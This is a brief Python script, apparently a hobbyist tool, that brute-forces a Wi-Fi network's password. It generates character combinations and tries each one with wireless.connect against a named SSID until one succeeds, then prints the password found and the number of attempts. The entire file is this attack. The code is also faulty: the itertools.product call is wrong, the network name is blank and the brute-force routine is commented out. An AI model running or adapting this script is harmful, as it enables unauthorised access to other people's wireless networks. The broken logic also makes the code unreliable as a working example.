from wireless import Wireless 
import itertools, threading
#https://pypi.org/project/wireless/

wireless = Wireless() 
alpha = r'abcdefghijklmnopqrstuvwxyz1234567890@<({[/=]})>!?$%&#*-+.,;:_'    #look at String module
networkName = ''

def myNetwork():
    print(wireless.driver())
def passwordCreate(min=5,max=10):
    for x in range(min,max):
        prod = itertools.product(alpha,x)
        for str in prod:
            test = strCheck(str)
            if test:
                yield str
def strCheck(str, limitedQuantity=3):
    #returns str or False based on weather str meets password criterias
    #if too many of character in string
    for cha in str:
        if str.count(cha) >= limitedQuantity:
            return False
    #else
    return str

def mane():
    count = 0
    passwordGen = passwordCreate(5,10)
    for password in passwordGen:
        goAhead = wireless.connect(ssid=networkName, password=password)
        count += 1
        if goAhead:
            break
    print(password)
    print(count)

if __name__ == "__main__":
    #mane()
    myNetwork()